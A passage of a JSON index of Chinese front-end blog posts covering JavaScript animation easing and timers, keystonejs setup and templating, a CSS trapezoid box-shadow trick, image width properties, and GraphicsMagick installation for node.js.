easingFn.easingQuadraticIn = function (t) { return t*t; };\n```\n### 分析对比结果\n基本数学公式是一样的，都是2次方；\n缓动函数是独立的，与平台载体无关；\n缓动函数反应的是动画进程与数值变化量的对应关系，具体分析如下：\n\n[GSAP Ease在线示例][8]，动画进程每增加一格，数值变化量是增加量是越来越大的，效果就是由慢到快。\n![clipboard.png](greensockEase.png)\n\n与定时器无关，具体演变代码分析如下：\n左侧演示的是，由于算法二次方，进程每次等量增加1/5，但是变化量却越来越大；右侧演示的是，虽然定时器改变了（间隔减小一倍，由“滴答”执行五次改成十次），但是变化量的趋势是一样的，相同的进程增量，对应的变化量也是相同。\n![clipboard.png](yansuan.png)\n\n## 动画库\n\n动画库做的事基本就是一下四点：1，定时器；2，各种属性变量处理的封装；3，过程控制；4，缓动函数。\n\n实际运用中还是推荐大家用动画库，不满足业务需求的可以自己整合，当然学习的时候可以找个简单的读下源码，试着自己写下核心功能，深入理解动画库的本质，入门我推荐**Kute.js**。\n\n## 动画库推荐（各自优劣势及区别下次再详述）\n[jquery animate(插件jquery.easing.js)][9]\n[Tween.js][10]\n[GSAP][11]\t\n[CreateJS][12]\n[Kute.js][13]\n\t\n\n\n  [1]: http://gsgd.co.uk/sandbox/jquery/easing/\n  [2]: http://www.zhangxinxu.com/study/201612/how-to-use-tween-js.html\n  [3]: https://github.com/tweenjs/tween.js/blob/master/src/Tween.js\n  [4]: http://gsgd.co.uk/sandbox/jquery/easing/\n  [5]: https://greensock.com\n  [6]: https://github.com/CreateJS/TweenJS/blob/master/src/tweenjs/Ease.js\n  [7]: http://thednp.github.io/kute.js/\n  [8]: https://greensock.com/docs/Easing\n  [9]: http://gsgd.co.uk/sandbox/jquery/easing/\n  [10]: https://github.com/tweenjs/tween.js\n  [11]: https://greensock.com\n  [12]: https://github.com/CreateJS\n  [13]: http://thednp.github.io/kute.js/","tags":["JavaScript"],"categories":["前端"]},{"title":"JS动画（一）——定时器详解","url":"%2F2018-JS%E5%8A%A8%E7%94%BB%E4%B9%8B%E5%AE%9A%E6%97%B6%E5%99%A8%E8%AF%A6%E8%A7%A3%2F","content":"广义说：一切通过js改变的视觉呈现都叫动画；例如，按钮，链接等元素交互反馈。\n狭义说：通过定时器连续调用js函数进行元素属性改变产生的视觉动画效果。\n## 定时器 ##\n定时器是JavaScript动画的核心技术；\nsetTimeout(),setInterval()是大家熟知的，以前经常使用的；\n一般都是做些辅助性，锦上添花的事；\n细心的人可能会发现一个现象，从其他标签页切换到有循环动画页面会有卡顿和急速帧切换现象；\n问题就在于他们的内在运行机制；\n\n### 认识setTimeout ###\n第一个参数推荐用函数形式，字符串形式会两次解析，还有eval一样的问题；\n不止两个参数，可以更多，见示例1；\nthis指向问题，见示例2；\n返回值是个整数；\nclearTimeout(timer)取消定时器；\nsetInterval,clearInterval同上；\n\n示例1：\n```\nsetTimeout(function(a,b){ \n\tconsole.log(a+b); \n},1000,1,1)；\n\n```\n示例2：\n```\nvar a = 0;\nfunction foo(){\n    console.log(this.a);\n};\nvar obj = {\n    a : 2,\n    foo:foo\n}\nsetTimeout(obj.foo,100);\n\n```\n### 运行机制 ###\n示例：\n\n```\nsetTimeout(function(){ \n\tconsole.log(1); \n}); \nconsole.log(0);\n```\n原因：加入队列，阻塞执行。\n\nsetTimeout图例：\n![](setTimeout.png)\n\nsetInterval图例：\n![](setInterval.png)\n### 存在即合理 ###\n父子元素事件冒泡，需要先执行父元素，见示例3；\n用户自定义的回调函数，通常在浏览器的默认动作之前触发，见示例4；\n\n示例3：\n```\n<div id=\"myDiv\" style=\"height: 100px;width: 100px;background-color: pink;\"></div>\n<script>\nmyDiv.onclick = function(){\n    setTimeout(function(){\n        alert(0);\n    })\n}\ndocument.onclick = function(){\n    alert(1);\n}\n</script>\n\n```\n示例4：\n\n```\n<input type=\"text\" id=\"myInput\">\n<script>\nmyInput.onkeypress = function(event) {\n    setTimeout(function(){\n        myInput.value = myInput.value.toUpperCase();\n    });\n}\n</script>\n\n```\n### 认识requestAnimationFrame ###\n用法与setTimeout类似，只是不需要时间参数；\n机制完全不同：\n1， setTimeout是异步操作，加入任务队列（ event loop ），当js引擎线程中同步代码执行完才会从任务队列中取出执行；\n2，raf是用户代理（浏览器）专门针对动画开发的接口，用户代理会以合适的频率进行动画帧更新（一般同显示器刷新频率，1000/60ms），在隐藏或者非活动页面会停止帧更新，节省CPU资源；\n3，[raf示例][1]\n### raf简单兼容 ###\n\n```\nwindow.requestAnimFrame = (function(){ \n    return  window.requestAnimationFrame || \n            window.webkitRequestAnimationFrame ||         \n            window.mozRequestAnimationFrame || \n            function( callback ){ \t\n                window.setTimeout(callback, 1000 / 60);\n         \t};\n     })();\n\n```\n参考：\n[setTimeout详细介绍][2]\n\n\n  [1]: https://codepen.io/lovechoose/pen/OzVPgg\n  [2]: http://www.cnblogs.com/xiaohuochai/p/5773183.html","tags":["JavaScript"],"categories":["前端"]},{"title":"keystonejs实战之页头页脚","url":"%2F2018-keystonejs%E5%AE%9E%E6%88%98%E4%B9%8B%E9%A1%B5%E5%A4%B4%E9%A1%B5%E8%84%9A%2F","content":"前两篇介绍了入门相关知识及对keystonejs整体可用性评估，这篇介绍下开始实际运用中的页头页脚部分，因为马上项目忙了，这个先匆匆的作个收尾。\n\n不管是用WordPress还是其他CMS系统，应用最宽泛的也是最基础的就是企业宣传类网站，我们就讲下keystonejs实现的头尾改造，效果如下图：\nPC页头\n![图片描述](1.jpg)\n\nPC页脚\n![图片描述](2.jpg)\n\n移动页头\n![图片描述](3.jpg)\n\n移动页脚\n![图片描述](4.jpg)\n\n具体改造也很简单，首先找到H:\\workspace\\keystonejs-project\\routes\\middleware.js文件，然后增加`navLinksCN`代码如下：\n\n```\nexports.initLocals = function(req, res, next) {\n    res.locals.navLinks = [\n        { label: 'Home', key: 'home', href: '/' },\n        { label: 'Blog', key: 'blog', href: '/blog' },\n        { label: 'Gallery', key: 'gallery', href: '/gallery' },\n        { label: 'Contact', key: 'contact', href: '/contact' },\n    ];\n    res.locals.navLinksCN = [\n        { label: '首页', key: 'home', href: '/' },\n        { label: '新闻动态', key: 'blog', href: '/blog' },\n        { label: '作品展示', key: 'gallery', href: '/gallery' },\n        { label: '联系我们', key: 'contact', href: '/contact' },\n    ];\n    res.locals.user = req.user;\n    next();\n};\n```\n然后找到H:\\workspace\\keystonejs-project\\templates\\layouts\\default.pug文件，复制一份，改名如main.pug，接下来就是具体的HTML+CSS部分了。\n\n - 在site.css下方再引入我们自定义的样式文件如：`link(href=\"/styles/style.css\", rel=\"stylesheet\")`；\n - 添加header代码，如：\n```\n\t\t//- HEADER\n\t\tdiv(style='width:100%')\n\n\t\t\t//- Customise your site's navigation by changing the navLinks Array in ./routes/middleware.js\n\t\t\t//- ... or completely change this header to suit your design.\n\t\t\t\n\t\t\t.box1#head\n\t\t\t\t.navBox\n\t\t\t\t\t.mabox\n\t\t\t\t\t\t.weima\n\t\t\t\t\t\t\timg(src='../images/ma.jpg')\n\t\t\t\t\ta.nav-left(href='index')\n\t\t\t\t\t\timg(src='../images/logo.svg')\n\t\t\t\t\t.nav-right\n\t\t\t\t\t\tdiv\n\t\t\t\t\t\t\ta.weibo(href='',target='_blank')\n\t\t\t\t\t\t\ta.weixin\n\t\t\t\t\t\t\ta.gouwuche(href='',target='_blank')\n\t\t\t\t\t.nav-center\n\t\t\t\t\t\n\t\t\t\t\t\tul.menu\n\t\t\t\t\t\t\teach link in navLinksCN\n\t\t\t\t\t\t\t\tli(class=(section == link.key ? 'active' : null)): a(href=link.href)= link.label\n\n\t\t\t\t\t\tnav(role='navigation').navbar.navbar-default\n\t\t\t\t\t\t\t.container-fluid\n\t\t\t\t\t\t\t.navbar-header.text-right\n\t\t\t\t\t\t\t\tbutton(type='button').navbar-toggle\n\t\t\t\t\t\t\t\t\tspan.sr-only 切换导航\n\t\t\t\t\t\t\t\t\tspan.icon-bar\n\t\t\t\t\t\t\t\t\tspan.icon-bar\n\t\t\t\t\t\t\t\t\tspan.icon-bar\n```\n\n - 添加footer部分代码，如：\n\n```\n\t\t//- FOOTER\n\t\t//- .container: #footer\n\n\t\t.box1.foot#foot\n\t\t\t.top\n\t\t\t\t.box2 返回顶部\n\t\t\t.box2\n\t\t\t\t.dianshang\n\t\t\t\t\tspan xxx电商渠道:\n\t\t\t\t\tp \n\t\t\t\t\t\ta(href=\"http://\" target=\"_blank\") 天猫\n\t\t\t\t\t\ta(href=\"http://\" target=\"_blank\") 京东\n\t\t\t\t\t\ta(href=\"http://\" target=\"_blank\") 苏宁\n\t\t\t\t\t\ta(href=\"http://\" target=\"_blank\") 微信商城\n\t\t\t\t.cont\n\t\t\t\t\t.d1\n\t\t\t\t\t\timg(src='../images/ma2.jpg')\n\t\t\t\t\t.d2\n\t\t\t\t\t\tp 正月初五科技有限公司\n\t\t\t\t\t\tp 联系电话：400-8888-888\n\t\t\t\t\t\tp 北京市朝阳区朝阳门大街88号\n\t\t\t\t\t.d3\n\t\t\t\t\t\timg(src='../images/ma2.jpg')\n\t\t\t\tp.bei ©2014-2017 正月初五   版权所有 | 京ICP备88888888号-1\n```\n\n - 最后，把具体views中页面引用的default模板改成main，如：\n\n```\nextends ../layouts/main\n```\n\n好了，重启下应用看看效果吧。\n备注：\npug模板引擎中文文档[pug文档][5]。\n\n\n  [5]: https://pugjs.org/zh-cn/api/getting-started.html","tags":["Node.js"],"categories":["其他"]},{"title":"keystonejs富文本问题及思考过程","url":"%2F2018-keystonejs%E5%AF%8C%E6%96%87%E6%9C%AC%E9%97%AE%E9%A2%98%E5%8F%8A%E6%80%9D%E8%80%83%E8%BF%87%E7%A8%8B%2F","content":"上一篇讲了keystonejs的环境搭建，helloworld跑起来之后，实际运用中会发现各种问题，今天就说下富文本编辑器的问题（针对后端不熟的同学）。\n\n不太熟悉网页嵌入富文本编辑器的同学可能和我一样，当实际发博文的时候，发现默认的编辑器好简单，常用的h1,h2,分割线，代码引用等没有对应的按钮。怎么办？我当时的思考过程如下：\n\n**首先**，认为这是作者自己开发的简易文本编辑器，想丰富只能找其他的替代。那就开始重点搜开源的，支持markdown的js富文本编辑器，结果找到了[Editor.md][1]，大概看了下，还是蛮丰富的。\n\n**然后**，开始改造吧，结果找了半天没有找到对应的代码，后来才发现后台admin部分的透明，项目下没有后台相关文件，真是“辛辛苦苦大半年，一朝回到解放前。”\n\n**再然后**，想着要么改造系统级源码，成本太高，要么放弃，折腾半天放弃，太可惜。难道这真的是“鸡肋”吗？不可能啊，star一万多，还是先从自身找原因，继续研究。\n\n**最后**，在文档配置模块下找到了后台UI配置（Configuration>Admin UI Options），原来作者是用的[tinymce][2]，keystonejs文档给了简单的配置说明，详细部分还是参考tinymce官方文档。\n\n备注\n--\n\n默认的样式：\n![图片描述](1.jpg)\n官方配置示例：\n![图片描述](2.jpg)\n![图片描述](3.jpg)\n\n\n  [1]: https://pandao.github.io/editor.md/\n  [2]: https://www.tinymce.com/","tags":["Node.js"],"categories":["其他"]},{"title":"（入门）keystonejs入门教程之环境搭建","url":"%2F2018-keystonejs%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F","content":"## 基础环境 ##\nNode.js 0.10+ 和MongoDB v2.4+；\n## 基础知识 ##\njavascript，nodejs，npm，数据库，cms；\n## 执行命令 ##\n\n - 安装脚手架\n```\nnpm install -g generator-keystone\n```\n - 创建项目并进入目录\n\n```\nmkdir my-test-project\ncd my-test-project\n```\n\n - 安装Yeoman（脚手架是用Yeoman制作的）\n\n```\nnpm install -g yo\n```\n\n - 运行脚手架\n\n```\nyo keystone\n```\n\n----------\n环境搭建完成\n----------\n\n\n## 启动 ##\n\n```\nnode keystone\n```\n## 访问 ##\n前台页面\n[http://localhost:3000][1]\n后台页面\n[http://localhost:3000/keystone][2]\n\n\n----------\n\n\n## 备注 ##\n\n 1. 管理员权限，数据库连接等[常见问题][3]；\n 2. 后台登录用户名密码是运行脚手架时输入的，默认是user@keystonejs.com/admin；\n 3. windows下安装MongoDB卡死问题，原因是默认安装mongodb compass（比较大）所致，因此安装时选择自定义custom，过程中取消mongodb compass的安装勾选，需要的可以单独安装；\n 4. [keystonejs官方网站][4]\n\n\n  [1]: http://localhost:3000\n  [2]: http://localhost:3000/keystone\n  [3]: http://keystonejs.com/getting-started/\n  [4]: http://keystonejs.com/","tags":["Node.js"],"categories":["其他"]},{"title":"多边形，梯形盒阴影css实现技巧","url":"%2F2018-%E6%A2%AF%E5%BD%A2%E7%9B%92%E9%98%B4%E5%BD%B1%2F","content":"\n# 概述\n一般情况下，我们给块状元素（四边形）添加阴影样式，直接用css`box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1);`就可以了，但是总有一些需求是那么的特别，例如下图：\n\n![梯形盒阴影图](1.jpg)\n\n要求给这样的梯形盒外围加阴影，第一眼感觉也没啥特别的，但是搞起来就知道多烦了。反正我是折腾了好一会儿，最后只能用下面这样实现了。\n<!-- more -->\n# 详述\n## HTML和CSS（sass）代码：\n\n```html\n    <div class=\"m-tab-page-box cf\">\n        <div class=\"m-tab-page\">\n            <a class=\"m-page-item\" href=\"\">Set Physical Presence </a>\n            <a class=\"m-page-item current\" href=\"\">Set Prodcut Tax Code </a>\n        </div>\n        <div class=\"m-tab-page-cover\"></div>\n    </div>\n\n    <div class=\"tab-search-block\">\n        <div style=\"height: 160px;\"></div>\n    </div>\n```\n\n```css\n.m-tab-page-box{\n    position: relative;\n}\n.m-tab-page-cover{\n    width: 100%;\n    height: 3px;\n    background: #fff;\n    position: absolute;\n    bottom: -3px;\n}\n.m-tab-page {\n    float: left;\n    border-bottom: none;\n    margin-bottom: 0;\n    display: inline-block;\n    box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1);\n    height: 38px;\n\n    .m-page-item {\n        display: block;\n        padding: 10px 20px;\n        float: left;\n        color: #222;\n        font-weight: bold;\n        margin-bottom: 0;\n        background: #edf0f2;\n\n        &.current {\n            background: #fff;\n            border: none;\n\n        }\n    }\n\n}\n\n.tab-search-block{\n    background: #fff;\n    box-shadow: 0 1px 3px 0px rgba(0, 0, 0, 0.1);\n    margin-bottom: 20px;\n\n}\n```\n## 实现思路：\n'.m-tab-page'设成行内元素，加阴影，'.tab-search-block'加阴影，**重点**是在'.m-tab-page-box'中添加一个'.m-tab-page-cover'，该元素的作用就是遮住'.m-tab-page'元素的底部阴影，注意'.m-tab-page-cover'的高度为盒阴影扩散的距离。\n\n# 后记\n如果哪位有更好的思路，烦请留言说下啊。","tags":["CSS"],"categories":["前端"]},{"title":"width、naturalWidth、clientWidth、offsetWidth区别整理","url":"%2F2018-width%E3%80%81naturalWidth%E3%80%81clientWidth%E3%80%81offsetWidth%E5%8C%BA%E5%88%AB%E6%95%B4%E7%90%86%2F","content":"今天在做图片裁剪功能的时候，参考了下网友的资料，发现大家对图片宽度的获取方式不尽相同，于是详细整理下各个属性的区别（详细请参考[MDN](https://developer.mozilla.org/zh-CN/docs/Web/API)）。\n\n1，`HTMLImageElement.width`是一个`unsigned long` 类型反映了 [`width` ](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img#attr-width)HTML 属性, 说明图像在CSS像素中渲染的宽度。\n\n2，`HTMLImageElement.naturalWidth`返回一个 `unsigned long` 类型,表明图像在CSS像素中固有的宽度,如果可用的话； 否则, 返回`0`。\n\n3，`Element.clientWidth` 属性表示元素的内部宽度，以像素计。该属性包括内边距，但不包括垂直滚动条（如果有）、边框和外边距。该属性值会被四舍五入为一个整数。如果你需要一个小数值，可使用 [`element.getBoundingClientRect()`](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect \"Element.getBoundingClientRect()方法返回元素的大小及其相对于视口的位置。\")。\n![clientWidth](clientWidth.png)\n\n4，`HTMLElement.offsetWidth` 是一个只读属性，返回一个元素的布局宽度。一个典型的（译者注：各浏览器的offsetWidth可能有所不同）offsetWidth是测量包含元素的边框(border)、水平线上的内边距(padding)、竖直方向滚动条(scrollbar)（如果存在的话）、以及CSS设置的宽度(width)的值。\n![offsetWidth](offsetWidth.png)","tags":["HTML"],"categories":["前端"]},{"title":"GraphicsMagick for node.js环境搭建","url":"%2F2018-gm-1%2F","content":"\n\n## 本人背景环境windows7 64位，nodejs v6.11.0，git version 2.7.2.windows.1；\n\n## 具体步骤如下：\n1. 下载[GraphicsMagick](ftp://ftp.graphicsmagick.org/pub/GraphicsMagick/windows/)，一路Next完成安装，然后cmd调用命令窗口输入gm回车，如果能正确显示类似如下信息说明安装成功：\n```     \n    H:\\workspace\\gm\\examples>gm\n\n    GraphicsMagick 1.3.26 2017-07-04 Q16 http://www.GraphicsMagick.org/\n    Copyright (C) 2002-2017 GraphicsMagick Group.\n    Additional copyrights and licenses apply to this software.\n    See http://www.GraphicsMagick.org/www/Copyright.html for details.\n    Usage: gm command [options ...]\n\n    Where commands include:\n        batch - issue multiple commands in interactive or batch mode\n    benchmark - benchmark one of the other commands\n        compare - compare two images\n    composite - composite images together\n        conjure - execute a Magick Scripting Language (MSL) XML script\n        convert - convert an image or sequence of images\n        help - obtain usage message for named command\n    identify - describe an image or image sequence\n        mogrify - transform an image or sequence of images\n        montage - create a composite image (in a grid) from separate im\n        time - time one of the other commands\n        version - obtain release version\n    register - register this application as the source of messages           \n```\n2. 如果只是学习可以cmd命令窗口执行`git clone git://github.com/aheckmann/gm.git`，然后到该目录下执行`npm install`完成相关依赖包安装后就可以到examples下试试各种demo了，例如我的执行:\n\n```\n    H:\\workspace\\gm\\examples>node append\n\n    H:\\workspace\\gm\\examples/imgs/append.jpg created  ::  gm \"convert\"\n    \"#222\" \"H:\\workspace\\gm\\examples/imgs/lost.png\" \"H:\\workspace\\gm\\e\n    original.jpg\" \"-append\" \"H:\\workspace\\gm\\examples/imgs/append.jpg\"\n```\n\n3. 如果从零开始，实际示例如下：\n         \n    创建根目录:\n\n            mkdir gm-study\n\n    到该目录下:\n\n            cd gm-study\n\n    初始化创建package.json:\n\n            npm init\n\n    安装gm:\n\n            npm install gm --save\n\n    创建执行文件:\n\n            type nul>index.js\n\n    打开index.js并黏贴[gm](https://github.com/aheckmann/gm)官方示例代码并修改路径:\n        \n        var fs = require('fs')\n        , gm = require('gm');\n\n        // resize and remove EXIF profile data\n        gm('imgs/1.jpg')\n        .resize(240, 240)\n        .noProfile()\n        .write('out/resize.png', function (err) {\n        if (!err) console.log('done');\n        });\n        \n    执行node命令:\n\n        node index\n\n","tags":["实战"],"categories":["其他"]}]